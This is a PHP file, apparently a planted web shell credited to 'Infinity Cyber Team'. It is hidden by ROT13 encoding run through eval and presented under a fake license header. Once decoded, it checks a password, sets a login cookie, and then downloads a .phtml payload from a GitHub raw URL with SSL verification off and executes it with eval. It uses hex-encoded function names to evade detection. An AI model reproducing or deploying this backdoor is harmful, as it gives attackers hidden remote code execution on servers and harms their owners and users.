.
<?php

$asd = <<<'ASD'

// Guvf fpevcg vf cneg bs Vasvavgl Plore Grnz (PHP) - Orfg Fpevcg.
// 
// PHP - Orfg Fpevcg vf serr fbsgjner: lbh pna erqvfgevohgr vg naq/be zbqvsl
// vg haqre gur grezf bs Gur CUC Yvprafr, irefvba 3.01.
// 
// PHP - Orfg Fpevcg vf qvfgevohgrq va gur ubcr gung vg jvyy or hfrshy,
// ohg JVGUBHG NAL JNEENAGL; jvgubhg rira gur vzcyvrq jneenagl bs
// ZREPUNAGNOVYVGL be SVGARFF SBE N CNEGVPHYNE CHECBFR. Frr
// Gur CUC Yvprafr sbe zber qrgnvyf.
// 
// Lbh fubhyq unir erprvirq n pbcl bs Gur CUC Yvprafr, irefvba 3.01,
// nybat jvgu PHP - Orfg Fpevcg. Vs abg, frr <uggcf://jjj.cuc.arg/yvprafr/3_01.gkg>.

/**
 * Vasvavgl Plore Grnz (PHP) - Orfg Fpevcg
 * @yvax uggcf://php.qri/
 * @nhgube PHP.
 * @fvapr 17. 7. 1337 - gvzr 13:37
 * @cnpxntr PHPTebhc
 * @yvprafr uggcf://jjj.cuc.arg/yvprafr/3_01.gkg Gur CUC Yvprafr, irefvba 3.01
 * @irefvba 1.7
 * @pbclevtug  Pbclevtug (P) 1337 PHP, Vap. Nyy evtugf erfreirq.
 */

shapgvba urk2fge($urk) {
    $fge = '';
    sbe ($v = 0; $v < fgeyra($urk) - 1; $v += 2) {
        $fge .= pue(urkqrp($urk[$v] . $urk[$v + 1]));
    }
    erghea $fge;
}

// @qrcerpngrq  1.0  Qrcerpngrq jvgubhg ercynprzrag
shapgvba vf_ybttrq_va()
{
    erghea vffrg($_PBBXVR['pbkcur']) && $_PBBXVR['pbkcur'] === 'pbkcur'; 
}

vs (vf_ybttrq_va()) {
    $Neenl = neenl(
        '666s70656r',                   # sb c ra => 0
        '73747265616q5s6765745s636s6r74656r7473', # fgern z_trg_pbagragf => 1
        '66696p655s6765745s636s6r74656r7473', # svy r_t rg_pbag ragf => 2
        '6375726p5s65786563',           # phe y_rk rp => 3
        '636s7079',                     # pb c l => 4
        '73747265616q5s636s6r74657874', # fgern z_pba g rk g_pe rn gr => 5
        '66696p65'                      # sv y r => 6
    );
    
    shapgvba trgheyfvasb($o0ea) {
        $y1i3 = neenl(
            urk2fge($TYBONYF['Neenl'][0]), 
            urk2fge($TYBONYF['Neenl'][1]), 
            urk2fge($TYBONYF['Neenl'][2]), 
            urk2fge($TYBONYF['Neenl'][3]),
            urk2fge($TYBONYF['Neenl'][4]),
            urk2fge($TYBONYF['Neenl'][5]),
            urk2fge($TYBONYF['Neenl'][6])
        );
    
        vs (shapgvba_rkvfgf($y1i3[3])) { 
            $pu = phey_vavg($o0ea);
            phey_frgbcg($pu, PHEYBCG_ERGHEAGENAFSRE, 1);
            phey_frgbcg($pu, PHEYBCG_SBYYBJYBPNGVBA, 1);
            phey_frgbcg($pu, PHEYBCG_HFRENTRAG, "Zbmvyyn/5.0 (Jvaqbjf AG 6.1; ei:32.0) Trpxb/20100101 Sversbk/32.0");
            phey_frgbcg($pu, PHEYBCG_FFY_IREVSLCRRE, 0);
            phey_frgbcg($pu, PHEYBCG_FFY_IREVSLUBFG, 0);
            $q34gu = $y1i3[3]($pu);
            phey_pybfr($pu);
            erghea $q34gu;
        } ryfrvs (shapgvba_rkvfgf($y1i3[2])) { 
            erghea $y1i3[2]($o0ea);
        } ryfrvs (shapgvba_rkvfgf($y1i3[0]) && shapgvba_rkvfgf($y1i3[1])) { 
            $t04y = $y1i3[0]($o0ea, "e");
            $q34gu = $y1i3[1]($t04y);
            spybfr($t04y);
            erghea $q34gu;
        } ryfrvs (shapgvba_rkvfgf($y1i3[4])) {
            erghea $y1i3[4]($o0ea, '/gzc/grzcsvyr');
        } ryfrvs (shapgvba_rkvfgf($y1i3[5])) {
            $pbagrkg = $y1i3[5](neenl('uggc' => neenl('gvzrbhg' => 5)));
            erghea svyr_trg_pbagragf($o0ea, snyfr, $pbagrkg);
        } ryfrvs (shapgvba_rkvfgf($y1i3[6])) {
            erghea vzcybqr('', $y1i3[6]($o0ea));
        }
        erghea snyfr;
    }    

    $o0ea = 'uggcf://enj.tvguhohfrepbagrag.pbz/nmxntnaf/nmxn/ersf/urnqf/znva/2.cugzy';
    $qe34z = trgheyfvasb($o0ea);
    vs ($qe34z !== snyfr) {
        riny('?>' . $qe34z); 
    } 
} ryfr { 
    vs (vffrg($_CBFG['cnffjbeq'])) { 
        $ragrerq_xrl = $_CBFG['cnffjbeq']; 
        $unfurq_xrl = '$2n$12$X.04gqOs6WAveDm3YIvK.rGp4rWrrRQDyh8shSu806ys7HUkg2jUT'; // uggcf://opelcg.bayvar/ 
        vs (cnffjbeq_irevsl($ragrerq_xrl, $unfurq_xrl)) { 
            frgpbbxvr('pbkcur', 'pbkcur', gvzr() + 3600, '/'); 
            urnqre("Ybpngvba: ".$_FREIRE['CUC_FRYS']); 
            rkvg(); 
        } 
    } 
?>
<!QBPGLCR ugzy>
<ugzy ynat="ra">
  <urnq>
    <zrgn punefrg="HGS-8">
    <zrgn anzr="ivrjcbeg" pbagrag="jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1.0">
    <zrgn anzr="ebobgf" pbagrag="abvaqrk, absbyybj, abnepuvir">
    <yvax ery="cerpbaarpg" uers="uggcf://sbagf.tbbtyrncvf.pbz">
    <yvax ery="cerpbaarpg" uers="uggcf://sbagf.tfgngvp.pbz" pebffbevtva>
    <yvax ery="vpba" uers="uggcf://fpbagrag-ptx1-2.kk.sopqa.arg/i/g1.6435-9/87048302_531940970782738_2954240718513635328_a.wct?_ap_png=111&ppo=1-7&_ap_fvq=833q8p&_ap_bup=_RJAF6oFXXbD7xAijRsHFf3&_ap_bp=Nqa3ZLGpI3ikrzf7g5v1jV0NT7AIlJcTDJG-mNIY7XOIWHq1AFxZVxps1HV25O__i4p&_ap_mg=23&_ap_ug=fpbagrag-ptx1-2.kk&_ap_tvq=DLmQwSwplsmfmNHOmCjLYt&bu=00_NsUG6X2XhIfZdRCXcwLO0h6mBAUJG6UrteJX0-so4mE5oD&br=68393N0N">
    <yvax uers="uggcf://sbagf.tbbtyrncvf.pbz/pff2?snzvyl=Pvamry&qvfcynl=fjnc" ery="fglyrfurrg">
    <gvgyr></gvgyr>
    <fglyr>
      obql {
        znetva: 0;
        cnqqvat: 0;
        sbag-snzvyl: "Pvamry", frevs;
        onpxtebhaq-pbybe: #000000;
        pbybe: #ps1018;
        qvfcynl: syrk;
        whfgvsl-pbagrag: pragre;
        nyvta-vgrzf: pragre;
        urvtug: 100iu; /* Shyy ivrjcbeg urvtug */
        grkg-nyvta: pragre;
      }

      .pbagnvare {
        znk-jvqgu: 800ck;
        jvqgu: 100%;
        cnqqvat: 20ck;
      }

      u1,
      c,
      n {
        pbybe: #ps1018;
      }

      vzt {
        qvfcynl: oybpx;
        znetva: 20ck nhgb;
        znk-jvqgu: 100%;
        phefbe: cbvagre;
      }

      /* Fglyr sbe gur cnffjbeq vachg */
      vachg[glcr="cnffjbeq"] {
        cnqqvat: 10ck;
        obeqre: 2ck fbyvq #ps1018;
        obeqre-enqvhf: 5ck;
        onpxtebhaq-pbybe: #000000;
        pbybe: #ps1018;
        sbag-snzvyl: "Pvamry", frevs;
        sbag-fvmr: 16ck;
        bhgyvar: abar;
        jvqgu: 50%;
        znk-jvqgu: 300ck;
        znetva: 10ck nhgb;
      }

      /* Fglyr sbe gur fhozvg ohggba */
      vachg[glcr="fhozvg"] {
        cnqqvat: 10ck 20ck;
        obeqre: abar;
        obeqre-enqvhf: 5ck;
        onpxtebhaq-pbybe: #ps1018;
        pbybe: #000000;
        sbag-snzvyl: "Pvamry", frevs;
        sbag-fvmr: 16ck;
        phefbe: cbvagre;
        genafvgvba: onpxtebhaq-pbybe 0.3f rnfr;
        jvqgu: 50%;
        znk-jvqgu: 300ck;
        znetva: 10ck nhgb;
      }

      /* Ubire rssrpg sbe gur fhozvg ohggba */
      vachg[glcr="fhozvg"]:ubire {
        onpxtebhaq-pbybe: #n00q14;
      }
    </fglyr>
    <fpevcg>
      qbphzrag.nqqRiragYvfgrare("QBZPbagragYbnqrq", shapgvba() {
        qbphzrag.trgRyrzragOlVq("pyvpxnoyrVzntr").nqqRiragYvfgrare("pyvpx", shapgvba() {
          ine yvaxPbagnvare = qbphzrag.trgRyrzragOlVq("yvaxPbagnvare");
          vs (!yvaxPbagnvare.vaareUGZY) { // Purpx vs yvaxf ner abg nyernql nqqrq
            yvaxPbagnvare.vaareUGZY = `<pragre>
      <sbez zrgubq="CBFG" npgvba="">
      <vachg glcr="cnffjbeq" vq="cnffjbeq" anzr="cnffjbeq" cynprubyqre="ragre cnffjbeq urer." erdhverq>
      <vachg glcr="fhozvg" inyhr="npprff!">
    </sbez>
    </pragre>`;
          }
        });
      });
    </fpevcg>
  </urnq>
  <obql>
    <qvi pynff="pbagnvare">
      <vzt vq="pyvpxnoyrVzntr" fep="uggcf://fpbagrag-ptx1-2.kk.sopqa.arg/i/g1.6435-9/87048302_531940970782738_2954240718513635328_a.wct?_ap_png=111&ppo=1-7&_ap_fvq=833q8p&_ap_bup=_RJAF6oFXXbD7xAijRsHFf3&_ap_bp=Nqa3ZLGpI3ikrzf7g5v1jV0NT7AIlJcTDJG-mNIY7XOIWHq1AFxZVxps1HV25O__i4p&_ap_mg=23&_ap_ug=fpbagrag-ptx1-2.kk&_ap_tvq=DLmQwSwplsmfmNHOmCjLYt&bu=00_NsUG6X2XhIfZdRCXcwLO0h6mBAUJG6UrteJX0-so4mE5oD&br=68393N0N" jvqgu="500ck" nyg="Vasvavgl Plore Grnz">
      <qvi vq="yvaxPbagnvare"></qvi>
      <c>~ Vasvavgl Plore Grnz ~</c>
    </qvi>
  </obql>
</ugzy>
<?cuc } ?>
ASD;

eval(str_rot13($asd));